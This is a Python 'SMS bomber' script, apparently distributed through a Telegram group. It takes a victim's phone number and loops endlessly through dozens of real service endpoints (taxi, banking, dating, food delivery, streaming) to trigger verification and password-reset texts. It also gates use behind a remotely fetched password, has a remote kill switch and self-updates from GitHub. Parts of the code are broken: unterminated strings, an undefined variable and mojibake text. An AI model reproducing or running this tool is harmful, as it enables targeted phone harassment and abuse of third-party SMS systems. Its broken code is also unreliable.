import requests, random, datetime, sys, time, argparse, os
from colorama import init, Fore, Back, Style
from time import sleep
import urllib.request
import random
import base64
import subprocess
init()
def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def update():
    stuff_to_update = ['sms.py', '.version']
    for fl in stuff_to_update:
        dat = urllib.request.urlopen(
            "https://raw.githubusercontent.com/4nat/Reborn/master/" + fl).read()
        file = open(fl, 'wb')
        file.write(dat)
        file.close()
    print('\n\t\tUpdated Successfull !!!!')
    print('\tPlease Run The Script Again...')
    exit()

colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W='\033[0m'
def banner():
    logo ='''
   ___  _   _   ___ _____ 
  /   || \ | | / _ \_   _|
 / /| ||  \| |/ /_\ \| |  
/ /_| || . ` ||  _  || |  
\___  || |\  || | | || |  
    |_/\_| \_/\_| |_/\_/'''
    print(random.choice(colors)+logo+W)
    print("\n")
try:
    f = open(".4nat")
except IOError:
    os.system('clear')
    banner()
    print("Please Login")
    print("If u dont know login password come our telegram group | ")
    print("t.me/4natreborn ")
    print("t.me/ichbinharun")
    print ("")
    user = input("        'Enter' To Contiune!!!")
    if user == "":os.system('clear')
    banner()
    user =input('Username :  ')
    passwd = urllib.request.urlopen("https://raw.githubusercontent.com/4nat/reader/master/pass.txt").read()
    npasswd=int(base64.b64decode(passwd))
    upasswd =int(input('Password :  '))
    os.system('clear')
    time.sleep(2)
    if user=="reborn" and upasswd==npasswd:os.system('clear');print("Login Success!..");os.system("echo fuck society >.4nat")
    elif user=="reborn": os.system('clear');print("Incorrect Password!  >  Error Code : 101");sys.exit()
    elif user!="reborn" and passwd=="235467": os.system('clear');print("Incorrect Username!  >  Error Code : 102");sys.exit()
    elif user=="" and passwd=="": os.system('clear');print("Please Write Username and Password! >  Error Code : 103 ");sys.exit()
    else:  os.system('clear'); print("Incorrect Username and Password! >  Error Code :103");print("");print("Please Contact Develper.");print("t.me/ichbinharun");sys.exit()

def shutdown(signal, frame):
    print ('\n\033[1;31mCtrl+C was pressed, shutting down!\033[0m')
    sys.exit()

def checkinternet():
    res = False
    try:
        requests.get('https://www.google.com', verify=True)
        res = False
    except Exception:
        res = True
    if res:
        print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies..")
        banner()
        exit()
clr()
banner()
print('\tChecking For Updates...')
ver = urllib.request.urlopen(
    "https://raw.githubusercontent.com/4nat/Reborn/master/.version").read().decode('utf-8')
verl = ''
try:
    verl = open(".version", 'r').read()
except Exception:
    pass
if ver != verl:
    print('\n\t\tAn Update is Available....')
    print('\tStarting Update...')
    update()
    os.system("cd")
    os.system("rm -rf .4nat")
print("Your Version is Up-To-Date")
try:
    urllib.request.urlopen('https://www.google.com')
except Exception:
    print("You are not connected To Internet!!!")
    print("\tPlease Connect To Internet To Continue...\n")
    input('Exiting....\n Press Enter To Continue....')
    exit()

stat = urllib.request.urlopen("https://raw.githubusercontent.com/4nat/Reborn/master/.stat").read().decode('utf-8')
statu = '0'
if int(stat) == int(statu):print('\tProgram is Closed..');sys.exit();
else:print('Enjoy!');

try:
    noti = urllib.request.urlopen(
        "https://raw.githubusercontent.com/4nat/Reborn/master/.notify").read().decode('utf-8')
    noti = noti.upper().strip()
    if len(noti) > 10:
        print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
except Exception:
    pass


_phone=input(' Enter Target Number -->  ')

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]



iteration = 0
failed = 0
requested = 0
success = 0
banner()

while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'

	try:
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Grab Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] RuTaxi Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] BelkaCar Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
        except:
		print('[-] Tinder Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Karusel Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Tinkoff Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] MTS Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Youla Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] PizzaHut Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Rabota Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Smsint Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] oyorooms Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] MVideo Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½', 'lastName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] newnext Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Sunlight Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] alpari Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Invitro Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'ÃÂÃÂÃÂÃÂ¾ÃÂÃÂ»ÃÂÃÂÃÂÃÂ·ÃÂÃÂ¾ÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂÃÂÃÂµÃÂÃÂ»ÃÂÃÂ.ÃÂÃÂÃÂÃÂ°ÃÂÃÂÃÂÃÂ²ÃÂÃÂºÃÂÃÂ°ÃÂÃÂÃÂÃÂ°ÃÂÃÂ¤ÃÂÃÂ¸ÃÂÃÂ·ÃÂÃÂ¸ÃÂÃÂºÃÂÃÂ°','params':{'phone':_phone},'id':'1'})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Sberbank Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½','middleName':'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²ÃÂÃÂ¸ÃÂÃÂ','lastName':'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Psbank Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Beltelcom Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Karusel Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] KFC Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Citilink Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Delitime Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] findclone Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Guru Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] ICQ Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] InDriver Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Invitro Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Pmsm Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] IVI Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Lenta Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Mail.ru Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] MVideo Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] OK Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://plink.tech/register/',json={"phone": _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Plink Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] qlean Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] SMSgorod Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Tinder Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Twitch Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
		print('[+] CabWiFi Requests Successful!')
	except:
		print('[-] CabWiFi Requests Failed!')

	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] wowworks Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Eda.Yandex Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Youla Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Alpari Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1
	try:
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		print(random.choice(colors))
		os.system('clear)		
		print("Successful Requests   : ", success)
	except:
		print('[-] Delivery Requests Failed!')
	try:        
                success += 1
	except:
                failed += 1

	try:
		iteration += 1
		print(' = {}completed tours '.format(iteration)) 
	except:
		break
